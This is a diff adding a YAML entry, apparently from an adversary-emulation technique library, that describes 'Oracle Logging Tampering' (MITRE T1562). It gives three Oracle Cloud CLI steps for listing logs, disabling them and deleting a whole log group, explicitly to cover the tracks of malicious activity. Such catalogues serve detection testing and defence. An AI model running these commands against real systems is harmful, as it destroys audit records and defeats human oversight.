@@ -1,0 +1,11 @@
+description: Disable logging services to cover tracks of malicious activity.
+mitre_technique: T1562
+name: Oracle Logging Tampering
+stage: Defense Evasion
+steps:
+- action: oci logging log list --compartment-id <compartment-id>
+  description: List all logs
+- action: oci logging log update --log-id <log-id> --is-enabled false
+  description: Disable specific logs
+- action: oci logging log-group delete --log-group-id <log-group-id>
+  description: Delete entire log group
